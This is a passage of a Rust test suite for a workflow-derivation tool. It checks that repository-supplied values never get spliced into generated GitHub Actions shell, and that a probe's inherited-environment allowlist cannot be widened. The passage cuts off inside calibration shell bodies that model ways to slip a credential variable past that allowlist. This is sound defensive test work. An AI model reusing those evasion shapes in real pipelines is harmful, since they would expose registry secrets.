    /// package name, `environment_fragment` uppercases *and* maps every
    /// non-alphanumeric character to an underscore, and a validated name is
    /// lowercased in places. Each output has a roster row of its own naming the
    /// surface it is routed to, which is what closes them -- a transform's
    /// output is only invisible while it is unnamed. A new transform is
    /// answered the same way.
    ///
    /// One repository-supplied value is deliberately absent, and its absence is
    /// checked rather than asserted. The configured `prefix` *is* spliced into
    /// managed shell -- `${RUNNER_TEMP}/<prefix>npm-error` and every other
    /// prefixed path -- because it names identifiers rather than carrying data,
    /// and `config::validate_job_prefix` holds it to a GitHub job identifier
    /// before derivation ever sees it. The gate derives under a renamed prefix
    /// and requires the default spelling to be absent from shell, so an
    /// exception that had stopped being true would fail here.
    const REPOSITORY_SUPPLIED_VALUES: [(&str, &str, &str, Surface); 30] = [
        (
            "qhwzru",
            "qhwzru",
            "the release-unit identifier",
            Surface::Plain,
        ),
        ("vkjmtd", "vkjmtd", "the release-unit path", Surface::Plain),
        (
            "@kfnrbg/pxwqld",
            "pxwqld",
            "the npm package name",
            Surface::Plain,
        ),
        ("hbzqvn", "hbzqvn", "the Cargo crate name", Surface::Plain),
        (
            "mtdlgw",
            "mtdlgw",
            "the Cargo registry name",
            Surface::Plain,
        ),
        (
            "jvnqsx.example",
            "jvnqsx",
            "the Cargo registry index",
            Surface::Plain,
        ),
        (
            "KQVBZTLM",
            "KQVBZTLM",
            "the npm token-secret name",
            Surface::Expression,
        ),
        (
            "HGWRXPFD",
            "HGWRXPFD",
            "the Cargo token-secret name",
            Surface::Expression,
        ),
        // Derived from the values above rather than typed by an author, and on
        // the roster for that reason: a transform's output is a repository's
        // value in another shape, and the shape is what the comparison would
        // otherwise fail to recognise.
        (
            "@kfnrbg",
            "kfnrbg",
            "the npm scope, split from the package name",
            Surface::Plain,
        ),
        (
            "CARGO_REGISTRIES_MTDLGW",
            "MTDLGW",
            "the Cargo registry name, uppercased into a variable spelling",
            Surface::Plain,
        ),
        // The OCI surface. Both destinations are configured explicitly, and
        // both halves of each repository are separately typed by an author, so
        // owner and name are separate rows.
        (
            "jdmcvx",
            "jdmcvx",
            "the image release-unit identifier",
            Surface::Plain,
        ),
        (
            "bgqnwt",
            "bgqnwt",
            "the image release-unit path",
            Surface::Plain,
        ),
        (
            "rtwzlf",
            "rtwzlf",
            "the Feature release-unit identifier",
            Surface::Plain,
        ),
        (
            "kdshpm",
            "kdshpm",
            "the Feature release-unit path",
            Surface::Plain,
        ),
        (
            "gwlqcx",
            "gwlqcx",
            "the image name the Dockerfile label declares",
            Surface::Plain,
        ),
        (
            "nfxkbd",
            "nfxkbd",
            "the Feature id its manifest declares",
            Surface::Plain,
        ),
        (
            "zrpvhm",
            "zrpvhm",
            "the Docker Hub repository owner",
            Surface::Plain,
        ),
        (
            "phqvrb",
            "phqvrb",
            "the Docker Hub repository name",
            Surface::Plain,
        ),
        // The Docker Hub credential names. They are config-supplied, they pass
        // the same identifier validator as their npm and Cargo twins, and they
        // land on the same expression surface -- so they are rostered for the
        // same reason those two are. Injection through them is closed at
        // configuration load by the identifier grammar; what these rows hold is
        // *reach*, that each still arrives on the surface it is claimed to
        // arrive on and on no other. A row asserting they cannot carry an
        // injection would be documentation counted as a guard, because no input
        // reaches the splice check in the state it forbids.
        (
            "KLXVBRQ",
            "KLXVBRQ",
            "the Docker Hub username-variable name",
            Surface::Expression,
        ),
        (
            "WZDNGPT",
            "WZDNGPT",
            "the Docker Hub token-secret name",
            Surface::Expression,
        ),
        (
            "mwbqjt",
            "mwbqjt",
            "the GHCR repository owner",
            Surface::Plain,
        ),
        (
            "nkwzdt",
            "nkwzdt",
            "the GHCR repository name",
            Surface::Plain,
        ),
        // The global tag template's literal affixes. The Buildx build command
        // extracts the released version from the ref that triggered the run, so
        // these reach a build shell as values it reads; they were spliced into
        // that shell once, which is why they are named here rather than trusted
        // to stay routed.
        (
            "tzbrmk",
            "tzbrmk",
            "the global release tag prefix",
            Surface::Plain,
        ),
        (
            "dnwlpq",
            "dnwlpq",
            "the global release tag suffix",
            Surface::Plain,
        ),
        // The Go surface. Every value here is routed correctly today; the
        // defect the rows close is that nothing looked, because no gate
        // fixture had ever derived a GoReleaser release unit.
        (
            "wpdklc",
            "wpdklc",
            "the Go release-unit identifier",
            Surface::Plain,
        ),
        (
            "xnrjgb",
            "xnrjgb",
            "the Go release-unit path",
            Surface::Plain,
        ),
        (
            "svqtwm",
            "svqtwm",
            "the GoReleaser subject identity, from the native project name",
            Surface::Plain,
        ),
        (
            "zlfrhd",
            "zlfrhd",
            "the Homebrew tap repository owner",
            Surface::Plain,
        ),
        (
            "cbnwvk",
            "cbnwvk",
            "the Homebrew tap repository name",
            Surface::Plain,
        ),
        // The Arch package name is the declared `aur[].name` with the
        // packager's `-bin` rule applied, so the row carries the normalised
        // spelling and windows the declared token inside it.
        (
            "jgtxpz-bin",
            "jgtxpz",
            "the Arch package name, normalised by the -bin rule",
            Surface::Plain,
        ),
    ];

    /// Repository-supplied values closed at the boundary, and what closed them.
    ///
    /// A value whose role is *selection* among a finite set the derivation owns
    /// is answered by replacing it with its selection and refusing the unmapped
    /// case. It never reaches a sink, so it owes no routing and no escaping --
    /// and it therefore has no row on the roster above, which is the problem
    /// this list exists to solve. An absent row and a closed row look identical
    /// today. They diverge the moment someone adds a pass-through fallback to
    /// the match -- `_ => Some(format)`, a convenience, a relaxation to unblock
    /// a new packager -- at which point the value becomes repository text
    /// reaching derived shell with nothing registered and nothing looking.
    ///
    /// So the closure's refusal is load-bearing forever, and each row states
    /// three things: the value an author declares, the literal derivation
    /// replaces it with, and where the refusal that makes the match closed is
    /// proved. The gate asserts the declared spelling is absent from managed
    /// shell *and* the derived literal is present in it, because absent-because-
    /// closed and absent-because-nothing-derived read alike.
    ///
    /// `archlinux` is the only declared nfpm format that can witness this.
    /// `rpm`, `deb` and `apk` name packages spelled the same way, so a
    /// derivation that mapped them and one that passed them through emit the
    /// same text; an Arch package is `.pkg.tar.zst`, so only that row can tell
    /// the two apart.
    ///
    /// Each row is spelled in the sink's own shape -- `*.<extension>`, the
    /// `find` predicate the formats are consumed by -- rather than as the bare
    /// declared word. The bare word collides: the AUR promote body clones from
    /// `aur.archlinux.org`, which is derivation vocabulary and not a repository
    /// value at all. This is the same collision the roster's tokens are chosen
    /// opaque to avoid, and a closed value cannot be given an opaque spelling
    /// because the declaration is a fixed vocabulary.
    const CLOSED_AT_THE_BOUNDARY: [(&str, &str, &str); 1] = [(
        "*.archlinux",
        "*.pkg.tar.zst",
        "refuses_an_nfpm_format_it_cannot_recognise_as_a_native_package",
    )];

    /// Repository-supplied values that reach no managed content at all.
    ///
    /// A value the sentinel workspace supplies and derivation reads, which
    /// nonetheless lands on no surface a managed job carries. It cannot take a
    /// roster row, because a roster row asserts reach and there is nothing to
    /// reach; and it cannot simply be left out, because "no row" is what an
    /// unnoticed value looks like. So each is written down with the assertion
    /// its absence supports: absent from managed shell, and absent from both
    /// managed surfaces. A change that routes one of these into a step brings
    /// it into managed content, fires the row, and forces it onto the roster
    /// with a surface named -- which is the entry this list exists to guard.
    const ABSENT_FROM_MANAGED_CONTENT: [(&str, &str); 2] = [
        (
            "hqvzdn",
            "a per-unit tag template's literal affix, which reaches the sealed plan and no derived job",
        ),
        (
            "wzrjkd",
            "the configured gate job id, which reaches a managed job's `needs:` and nothing a step carries; reach is deliberately not checked against job identifiers, so it can hold no roster row",
        ),
    ];

    /// Managed jobs the sentinel configuration derives, without their prefix.
    ///
    /// Enumerated rather than counted, and enumerated independently of the
    /// derivation, so that a job disappearing from the sweep fails here instead
    /// of quietly shrinking what the gate reads. A gate that inspects fewer
    /// jobs than it did yesterday reports clean for a new reason.
    const SENTINEL_JOBS: [(WorkflowRole, &[&str]); 2] = [
        (WorkflowRole::Release, &["prepare", "release"]),
        (
            WorkflowRole::Publish,
            &[
                "assemble_evidence",
                "build_jdmcvx_buildx",
                "build_qhwzru_cargo",
                "build_qhwzru_cargo_archive",
                "build_qhwzru_cargo_archive_linux_x86_64",
                "build_qhwzru_cargo_archive_linux_arm64",
                "build_qhwzru_cargo_archive_macos_arm64",
                "build_qhwzru_npm",
                "build_rtwzlf_devcontainer_cli",
                "build_wpdklc_goreleaser",
                "close_release",
                "publish_jdmcvx_package_oci_dockerhub",
                "publish_jdmcvx_package_oci_ghcr",
                "publish_qhwzru_rust_cargo_primary",
                "publish_qhwzru_rust_homebrew_primary",
                "publish_qhwzru_node_npm_github",
                "publish_qhwzru_node_npm_primary",
                "publish_rtwzlf_package_oci_ghcr",
                "publish_wpdklc_package_aur_primary",
                "publish_wpdklc_package_homebrew_primary",
                "retrieve_qhwzru_rust_homebrew_primary",
                "retrieve_qhwzru_node_npm_github",
                "retrieve_wpdklc_package_homebrew_primary",
                "tag_after_publication",
                "tag_before_publication",
                // Task 179's deliverable-upload job comes into the sweep here
                // because the sentinel configuration derives a GoReleaser
                // publication, not because anything registered it: the sweep
                // recognises a managed job by its ownership sentinel, so a new
                // managed job joins the swept set the moment it is derived and
                // fails this enumeration until it is written down.
                "upload_deliverables",
                "verify_jdmcvx_package_oci_dockerhub",
                "verify_jdmcvx_package_oci_ghcr",
                "verify_qhwzru_node_npm_primary",
                "verify_qhwzru_rust_cargo_primary",
                "verify_rtwzlf_package_oci_ghcr",
                "verify_tag",
                "verify_wpdklc_package_aur_primary",
            ],
        ),
    ];

    /// Whether one shell body carries one repository-supplied value.
    ///
    /// Compared without case. A value that reaches shell through a case
    /// transform is exactly as exploitable -- every shell metacharacter
    /// survives one -- and this derivation applies `to_ascii_uppercase` to a
    /// repository-supplied value on its way to a variable name, so the evading
    /// form is one the code produces rather than a hypothetical.
    ///
    /// Case is the transform this closes and it is not the only one a value
    /// could survive. Transforms that keep a contiguous run of the value --
    /// truncation, windowing, reversal, whitespace trimming, path-component
    /// splitting -- are answered by the window check beside this one. Transforms
    /// that re-alphabet it, percent-encoding above all, are answered by neither,
    /// and the roster states what is owed when a recipe starts applying one.
    ///
    /// Stating the boundary is the point: a substring check is a recogniser,
    /// not a proof, and the property it stands in for is that values are routed
    /// rather than written.
    fn splices(body: &str, value: &str) -> bool {
        carries(body, value)
    }

    /// How many characters of a token a window keeps.
    ///
    /// Short enough that a truncation leaves one and long enough that an opaque
    /// token's window does not occur by accident.
    const WINDOW: usize = 4;

    /// Every contiguous window of one token, forwards and reversed.
    ///
    /// The tokens are chosen opaque so that a window of one does not collide
    /// with the derivation's own vocabulary: `unit` is a window of a release
    /// unit named `sentinelunit` and is also in every script that reads a
    /// prefixed release-unit variable, so a token spelled from that vocabulary
    /// would force the check to be weakened rather than the fixture fixed.
    ///
    /// Windows are taken over characters rather than bytes. A byte window of a
    /// non-ASCII value splits a code point and the lossy conversion that
    /// followed replaced the halves with U+FFFD, so every window of such a
    /// value was a string the value does not contain and the check silently
    /// recognised nothing. No rostered value is non-ASCII today; a manifest
    /// name, an image label and a tag affix can each be, and the recogniser
    /// must not be the thing that decides whether they are covered.
    fn windows(token: &str) -> impl Iterator<Item = String> + '_ {
        let reversed = token.chars().rev().collect::<String>();
        character_windows(token)
            .into_iter()
            .chain(character_windows(&reversed))
    }

    /// Which window of one token a body carries, if it carries one.
    ///
    /// The gate reads this and so does the control below it. They compared the
    /// same thing through two spellings before, which is an agreement nothing
    /// checked: a control that re-implements the check it controls goes on
    /// passing while the check it stands for stops working.
    fn carries_a_window(body: &str, token: &str) -> Option<String> {
        windows(token).find(|window| carries(body, window))
    }

    /// Every contiguous `WINDOW`-character run of one string, in order.
    fn character_windows(token: &str) -> Vec<String> {
        token
            .chars()
            .collect::<Vec<_>>()
            .windows(WINDOW)
            .map(|window| window.iter().collect())
            .collect()
    }

    /// Whether one surface carries one value, comparing the way `splices` does.
    ///
    /// Reach and exclusivity read this too. Three comparisons of the same kind
    /// answering the same question differently is how a value ends up counting
    /// as present on one surface and absent on another.
    fn carries(text: &str, value: &str) -> bool {
        text.to_ascii_lowercase()
            .contains(&value.to_ascii_lowercase())
    }

    // The comparison above has no live instance to catch, because the one
    // transform this derivation applies is now routed through `env:` instead.
    // A recogniser with nothing to recognise is a rule that cannot fail, so it
    // is exercised directly: a value reaching shell uppercased is the form the
    // gate would otherwise have read as absent.
    #[test]
    fn recognises_a_spliced_value_that_survived_a_case_transform() {
        let body = "INTENTIONAL_ALLOWED+=(CARGO_REGISTRIES_MTDLGW_TOKEN=\"x\")";
        assert!(
            splices(body, "mtdlgw"),
            "a value spliced in another case is still spliced"
        );
        assert!(splices("--registry mtdlgw", "mtdlgw"));
        assert!(!splices(
            "--registry \"${INTENTIONAL_REGISTRY_NAME}\"",
            "mtdlgw"
        ));
    }

    // The window generator is the gate's other recogniser and it had no control
    // of its own. Widening its window to 400 characters makes it yield nothing,
    // which satisfies every rule stated over it; neutering it to a single
    // lowercased token satisfies a non-emptiness check while silently demoting
    // the rule to the case-insensitive verbatim check that already exists. Both
    // left the suite green. What follows is the control: what the generator
    // produces is fixed against a count arrived at arithmetically and a set
    // built by slicing rather than by windowing, and what the rule does with
    // that output is exercised in both directions.
    #[test]
    fn generates_every_window_of_every_roster_token_and_nothing_else() {
        for (_, token, origin, _) in REPOSITORY_SUPPLIED_VALUES {
            let produced = windows(token).collect::<Vec<_>>();

            // Independent method one: arithmetic over the token's length. A
            // token of n characters has n - WINDOW + 1 forward windows and as
            // many reversed. Widening the window makes this zero, narrowing it
            // makes it larger, and collapsing the generator to the token itself
            // makes it one -- all three of which this equality names.
            let characters = token.chars().count();
            assert_eq!(
                produced.len(),
                2 * (characters + 1 - WINDOW),
                "{origin}'s token yields every window of it, forwards and reversed"
            );

            // Independent method two: the same windows built by slicing on
            // character boundaries instead of by windowing a character vector.
            // An equal count over the wrong content is what this catches.
            let boundaries = token
                .char_indices()
                .map(|(at, _)| at)
                .chain([token.len()])
                .collect::<Vec<_>>();
            let mut expected = boundaries
                .windows(WINDOW + 1)
                .map(|span| token[span[0]..span[WINDOW]].to_owned())
                .collect::<Vec<_>>();
            let reversed = token.chars().rev().collect::<String>();
            let reversed_boundaries = reversed
                .char_indices()
                .map(|(at, _)| at)
                .chain([reversed.len()])
                .collect::<Vec<_>>();
            expected.extend(
                reversed_boundaries
                    .windows(WINDOW + 1)
                    .map(|span| reversed[span[0]..span[WINDOW]].to_owned()),
            );
            assert_eq!(
                produced, expected,
                "{origin}'s windows are the contiguous runs of its token"
            );

            // The negative direction first, so that it is reached whatever the
            // generator produced: without it the rule would be satisfied by a
            // recogniser that matches anything, and every check above it is a
            // precondition a widened comparison trips before this is asked.
            // A body carrying a shorter run, and a body carrying an unrelated
            // run of window length, are both read as clean.
            let short: String = token.chars().take(WINDOW - 1).collect();
            assert_eq!(
                carries_a_window(&short, token),
                None,
                "{origin}: a run shorter than a window is not a window"
            );
            assert_eq!(
                carries_a_window("0369", token),
                None,
                "{origin}: an unrelated run of window length is not a window"
            );

            // And the rule the generator serves, read through the same helper
            // the gate reads, where a verbatim check cannot reach: a body
            // carrying only an interior run of the token -- neither the token
            // nor a prefix of it -- is recognised.
            let interior = &produced[produced.len() / 2 - 1];
            assert!(
                !carries(interior, token) && !token.starts_with(interior.as_str()),
                "{origin}'s control window is an interior run rather than the token or its prefix"
            );
            let body = format!("printf '%s' {interior}");
            assert_eq!(
                carries_a_window(&body, token).as_ref(),
                Some(interior),
                "{origin}: an interior run of the token reaching shell is recognised"
            );
            assert!(
                !carries(&body, token),
                "{origin}: the verbatim check reads that same body as clean, which is why the window check exists"
            );

            // The reversed arm needs its own control, and the assertion above
            // cannot be it: the window it picks is a forward one, so dropping
            // the reversed arm from the recogniser left this test green. Both
            // arms are the rule, and a reversal keeps every metacharacter.
            let backwards = &produced[produced.len() - 2];
            assert!(
                !character_windows(token).contains(backwards),
                "{origin}'s reversed control window is not also a forward window, or the forward arm answers for both"
            );
            let reversed_body = format!("printf '%s' {backwards}");
            assert_eq!(
                carries_a_window(&reversed_body, token).as_ref(),
                Some(backwards),
                "{origin}: an interior run of the token's reversal reaching shell is recognised"
            );
        }
    }

    // Windows are taken over characters, and nothing in the roster forces that
    // today because every rostered value is ASCII. Under the byte-oriented
    // generator this replaced the halves of every split code point with U+FFFD,
    // so a non-ASCII value's windows were strings the value does not contain
    // and the check recognised a splice of it as clean.
    #[test]
    fn windows_a_value_whose_characters_are_wider_than_one_byte() {
        let token = "\u{e9}\u{f6}\u{fc}\u{e5}\u{f8}";
        let produced = windows(token).collect::<Vec<_>>();
        assert_eq!(produced.len(), 4, "five characters yield two windows each");
        for window in &produced {
            assert_eq!(window.chars().count(), WINDOW);
            assert!(
                !window.contains('\u{fffd}'),
                "a window of {token:?} is characters of it, not the halves of one"
            );
        }
        let interior = &produced[1];
        assert_eq!(
            carries_a_window(&format!("echo {interior}"), token).as_ref(),
            Some(interior),
            "an interior run of a non-ASCII value reaching shell is recognised"
        );
    }

    /// Every managed job of one derived workflow, found without knowing the prefix.
    ///
    /// `managed_steps` recognises a managed job by its identifier, which begins
    /// with the configured prefix. That is right for the tests that assert what
    /// a prefix does, and wrong for a gate: a repository that configures any
    /// prefix but the default makes every such sweep inspect nothing and report
    /// clean. The ownership sentinel is the step id derivation reserves
    /// independently of the prefix precisely so ownership survives a prefix
    /// change, so it is what a gate recognises a managed job by.
    fn sentinel_jobs(root: &Path, role: WorkflowRole) -> Vec<(String, Vec<Value>)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"]
            .as_mapping()
            .expect("jobs")
            .iter()
            .filter_map(|(id, body)| {
                let id = id.as_str()?;
                let steps = body.get("steps")?.as_sequence()?;
                steps
                    .iter()
                    .any(|step| step.get("id").and_then(Value::as_str) == Some(OWNERSHIP_SENTINEL))
                    .then(|| (id.to_owned(), steps.clone()))
            })
            .collect()
    }

    /// Every `run:` body a managed job of one derived workflow carries.
    fn managed_shell_bodies(root: &Path, role: WorkflowRole) -> Vec<(String, String)> {
        sentinel_jobs(root, role)
            .into_iter()
            .flat_map(|(id, steps)| {
                steps.into_iter().filter_map(move |step| {
                    step["run"]
                        .as_str()
                        .map(|body| (id.clone(), body.to_owned()))
                })
            })
            .collect()
    }

    /// How many `run:` bodies each managed job of one derived workflow carries.
    ///
    /// A second walk of the same input, so the sweep above is held to an
    /// equality rather than to a floor. `managed_shell_bodies` flattens every
    /// job's steps into one stream and recognises a body by `run` holding a
    /// string; this indexes the document by each managed job's own identifier
    /// and recognises a step by carrying the `run` key at all. A sweep narrowed
    /// to the first body of each job -- the shape a `flat_map`/`filter_map`
    /// slipping to `find_map` produces -- satisfies every floor anyone would
    /// think to write, including non-emptiness, and disagrees with this.
    fn managed_shell_body_counts(root: &Path, role: WorkflowRole) -> BTreeMap<String, usize> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        sentinel_jobs(root, role)
            .into_iter()
            .map(|(id, _)| {
                let carried = document["jobs"][&id]["steps"]
                    .as_sequence()
                    .expect("a managed job carries steps")
                    .iter()
                    .filter(|step| step.get("run").is_some())
                    .count();
                (id, carried)
            })
            .collect()
    }

    /// The managed jobs of one derived workflow, split into the surfaces they carry.
    ///
    /// Shell is removed first and the remainder is split into the expressions
    /// the runner evaluates and everything else, so a claim about where a value
    /// landed is checked against that surface rather than against the document.
    /// Searching the document is how a value can be absent from the surface it
    /// was supposed to be on and present somewhere nobody looked.
    fn managed_surfaces(root: &Path, role: WorkflowRole) -> (String, String) {
        let mut expressions = String::new();
        let mut plain = String::new();
        for (_, steps) in sentinel_jobs(root, role) {
            // The job identifier is deliberately not part of any surface. It is
            // built by `identifier`, which reduces a value to what GitHub
            // accepts, so a value that survives into an identifier has been
            // transformed rather than carried -- and a reach claim satisfied by
            // one is satisfied by something other than the routing it is about.
            // 149 found exactly this: deleting a value's routed `env:` row left
            // its gate green because the job id still spelled it.
            let mut text = String::new();
            for step in steps {
                let mut step = step;
                if let Some(mapping) = step.as_mapping_mut() {
                    mapping.remove(Value::String("run".to_owned()));
                }
                text.push_str(&serde_yaml::to_string(&step).unwrap_or_default());
            }
            let mut rest = text.as_str();
            while let Some(open) = rest.find("${{") {
                plain.push_str(&rest[..open]);
                let tail = &rest[open..];
                let close = tail.find("}}").map_or(tail.len(), |end| end + 2);
                expressions.push_str(&tail[..close]);
                expressions.push('\n');
                rest = &tail[close..];
            }
            plain.push_str(rest);
        }
        (expressions, plain)
    }

    // Removing the file the probe used to copy removed the only place an
    // alternate registry's index was written down, so derivation reads it and
    // refuses when it is absent. That refusal is the whole of what replaced the
    // old behaviour: without it the index derives empty, the variable is
    // exported empty, and the failure moves from a diagnostic an author reads
    // to a runner nobody is watching.
    #[test]
    fn refuses_an_alternate_registry_whose_index_the_workspace_does_not_declare() {
        let workspace = workspace("workflow-undeclared-index");
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = &comparison.diagnostics[0];
        assert_eq!(diagnostic.code, "recipe-underivable");
        // The absence is named as an absence. Falling through to the value
        // validator would also refuse, because an empty index is not a URL, but
        // it would tell an author their index is malformed rather than that
        // they never wrote one -- and the two have different fixes.
        assert!(
            diagnostic.message.contains("declares no index")
                && diagnostic.message.contains(".cargo/config.toml")
                && diagnostic.message.contains("example-registry"),
            "the diagnostic names the registry, the file, and what is missing: {diagnostic:?}"
        );

        // Declaring it is what makes the same configuration derive.
        workspace.write(
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"sparse+https://registry.example/index/\"\n",
        );
        assert_eq!(
            compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison")
                .status,
            ComparisonStatus::Different,
            "a declared index derives the workflow the refusal was withholding"
        );
    }

    // Cargo has no command that uploads an existing `.crate`, so publication
    // re-packages the sources and `cargo publish` packages once more of its
    // own. The gate before it is what makes that survivable: it re-packages,
    // compares against the sealed subject, and refuses to publish if the bytes
    // differ. A published version is immutable, so the comparison has to happen
    // before the upload rather than after it -- which is the half of the
    // argument the doc comment spends a paragraph on and the half nothing was
    // checking. The readback half is guarded; this one was not.
    #[test]
    fn refuses_to_publish_a_crate_whose_repackaging_did_not_reproduce_the_subject() {
        let workspace = workspace("workflow-cargo-reproducibility");
        converge(workspace.root(), WorkflowRole::Publish);
        let publish = publisher_steps(workspace.root(), PRIMARY_TARGET)
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("cargo publish"))
            })
            .expect("the Cargo recipe publishes");

        let temporary = workspace.root().join("runner");
        let subject = temporary.join("intentional_subject/bytes");
        std::fs::create_dir_all(&subject).expect("subject directory");
        std::fs::write(
            subject.join("example-component-1.0.0.crate"),
            "the bytes the build sealed",
        )
        .expect("sealed subject");

        // The stub answers the existence probe with absence, so the recipe
        // proceeds to publish, and re-packages into bytes that differ from the
        // sealed subject -- the drift the gate exists to catch.
        let repackaged = temporary.join("intentional_repackage/package");
        let stubs = stub_client(
            &temporary.join("cargo"),
            "cargo",
            &format!(
                "{CARGO_NEW}case \"$1\" in \
                 add) echo 'error: the crate could not be found in registry index' >&2; exit 1 ;; \
                 package) mkdir -p \"{}\"; printf 'a different packaging' > \"{}\"; exit 0 ;; \
                 esac",
                repackaged.display(),
                repackaged.join("example-component-1.0.0.crate").display()
            ),
        );
        let (succeeded, calls) = run_step(&publish, &stubs, &temporary, &[]);
        assert!(
            !succeeded,
            "a repackaging that did not reproduce the sealed subject stops the publication"
        );
        assert!(
            !calls.lines().any(|line| line.starts_with("publish")),
            "the refusal happens before anything is submitted: {calls}"
        );
    }

    // Deleting the whole `RUSTUP_HOME` block left every test green: the
    // allowlist's membership was not asserted anywhere, so a member could be
    // added, dropped, or made conditional on the process environment without
    // anything noticing -- which is how a variable read from the environment
    // got back into a list whose entire purpose was that nothing is. The list
    // is the security property, so the list is what is asserted: exactly these
    // names, each unconditional, in both probes.
    /// The process variables a probe may inherit, written independently.
    ///
    /// Deliberately not `steps::INHERITED_ENVIRONMENT`: comparing the rendered
    /// allowlist against the constant that renders it compares the code with
    /// itself, so dropping a member changes both sides and the assertion holds.
    /// That is what happened -- the first version of this test passed with
    /// `RUSTUP_HOME` removed from the constant, which is the same defect the
    /// membership assertion exists to catch, one level up.
    const INHERITED: [&str; 3] = ["PATH", "HOME", "RUSTUP_HOME"];

    /// One assignment to the allowlist, and the conditions that govern it.
    struct AllowlistAssignment {
        /// The assignment itself, as one logical line.
        line: String,
        /// The conditions open around it, outermost first.
        conditions: Vec<String>,
    }

    /// Every assignment a rendered body makes to the allowlist, in order.
    ///
    /// The declaration comes first and the rest add to it. Membership used to
    /// be read from the prologue alone -- the lines above the probe helper --
    /// so the same conditional append moved four lines down, inside
    /// `resolve() {`, decided membership from the process environment with
    /// nothing to say so. Three things follow from that being a placement
    /// defect rather than a spelling one, and each is a way the same evasion
    /// comes back:
    ///
    /// - Nesting is tracked rather than stopped at, and the tracking checks
    ///   its own balance, so a body this scanner cannot follow fails here
    ///   rather than quietly reporting nothing to inspect.
    /// - `\`-continued lines are folded first. A condition read only to its
    ///   first physical line is a prefix again, and one backslash is cheaper
    ///   than four moved lines.
    /// - Re-assignment counts. `ALLOWED=("${ALLOWED[@]}" ...)` adds to the
    ///   list exactly as `+=` does, so the sweep keys on the list being
    ///   assigned, not on the token that happens to do it.
    ///
    /// `elif` opens no condition and `else` does not swap one, so an append in
    /// an else-branch is attributed the `if` it is not governed by. That
    /// direction over-reports -- a false rejection, never a false pass -- and
    /// no rendered body uses either.
    fn allowlist_assignments(body: &str) -> Vec<AllowlistAssignment> {
        let mut open: Vec<String> = Vec::new();
        let mut assignments = Vec::new();
        for line in logical_lines(body) {
            if let Some(condition) = line.strip_prefix("if ") {
                open.push(
                    condition
                        .trim_end_matches("then")
                        .trim()
                        .trim_end_matches(';')
                        .to_owned(),
                );
            }
            for _ in 0..assigned(&line) {
                assignments.push(AllowlistAssignment {
                    line: line.clone(),
                    conditions: open.clone(),
                });
            }
            if line == "fi" || line.ends_with(" fi") || line.ends_with(";fi") {
                open.pop().expect("a conditional closes one that opened");
            }
        }
        assert!(
            open.is_empty(),
            "the scanner followed every conditional in the body; left open: {open:?}"
        );
        assignments
    }

    /// How many times a fragment assigns the allowlist, counted without the sweep.
    ///
    /// This is the sweep's independent enumeration. A count taken from the
    /// sweep's own output cannot falsify the sweep -- a sweep that reads the
    /// first assignment of each body and stops agrees with itself perfectly --
    /// so the number the sweep is held to is read straight off the text.
    fn assigned(fragment: &str) -> usize {
        fragment.matches("INTENTIONAL_ALLOWED=").count()
            + fragment.matches("INTENTIONAL_ALLOWED+=").count()
    }

    /// A body's lines, with `\`-continuations folded into one logical line each.
    fn logical_lines(body: &str) -> Vec<String> {
        let mut lines = Vec::new();
        let mut pending: Option<String> = None;
        for raw in body.lines() {
            let trimmed = raw.trim();
            let continues = trimmed.ends_with('\\');
            let piece = trimmed.trim_end_matches('\\').trim_end();
            match &mut pending {
                Some(joined) => {
                    joined.push(' ');
                    joined.push_str(piece);
                }
                None => pending = Some(piece.to_owned()),
            }
            if !continues {
                lines.push(pending.take().expect("a logical line was started"));
            }
        }
        lines.extend(pending);
        lines
    }

    /// The variables one fragment expands, braced or not.
    ///
    /// The unbraced form is included because it is the same read: a member
    /// whose value is `"$SOMETHING"` is as much the process's as one whose
    /// value is `"${SOMETHING}"`. A positional parameter is skipped -- it is
    /// the generated script's own argument, not anything the process supplied.
    fn expanded_names(fragment: &str) -> Vec<String> {
        let characters = fragment.chars().collect::<Vec<_>>();
        let mut names = Vec::new();
        let mut index = 0;
        while index < characters.len() {
            if characters[index] != '$' {
                index += 1;
                continue;
            }
            let mut start = index + 1;
            if characters.get(start) == Some(&'{') {
                start += 1;
                if characters.get(start) == Some(&'!') {
                    start += 1;
                }
            }
            let mut end = start;
            while end < characters.len()
                && (characters[end].is_ascii_alphanumeric() || characters[end] == '_')
            {
                end += 1;
            }
            let name = characters[start..end].iter().collect::<String>();
            if !name.is_empty() && !name.starts_with(|first: char| first.is_ascii_digit()) {
                names.push(name);
            }
            index = if end > start { end } else { index + 1 };
        }
        names
    }

    /// The names an assignment reads that derivation did not choose.
    ///
    /// Every expansion an append performs -- in the value it adds and in the
    /// condition that decides whether it is added at all -- has to name a
    /// variable derivation wrote into the step's own `env:`, which is what the
    /// prefix marks. A bare name is one the process happened to carry, and
    /// either use hands the allowlist's membership back to the environment the
    /// allowlist exists to replace.
    fn unchosen_reads(assignment: &AllowlistAssignment) -> Vec<String> {
        std::iter::once(&assignment.line)
            .chain(assignment.conditions.iter())
            .flat_map(|fragment| expanded_names(fragment))
            .filter(|name| !name.starts_with("INTENTIONAL_"))
            .collect()
    }

    /// One written-out body the sweep and its recogniser are calibrated against.
    struct Calibration {
        /// What the body does.
        shape: &'static str,
        /// The body, a declaration followed by exactly one append.
        body: &'static str,
        /// The conditions that append is expected to be found under.
        conditions: usize,
        /// The names that append is expected to read unchosen.
        unchosen: &'static [&'static str],
    }

    /// Every evasion the sweep must see, and the one shape it must accept.
    const CALIBRATIONS: [Calibration; 7] = [
        Calibration {
            shape: "an append hidden inside the probe helper",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      INTENTIONAL_resolve() {
        if [ -n "${CARGO_UNSTABLE_REGISTRY_AUTH:-}" ]; then
          INTENTIONAL_ALLOWED+=(CARGO_UNSTABLE_REGISTRY_AUTH="${CARGO_UNSTABLE_REGISTRY_AUTH}")
        fi
      }
"#,
            conditions: 1,
            unchosen: &[
                "CARGO_UNSTABLE_REGISTRY_AUTH",
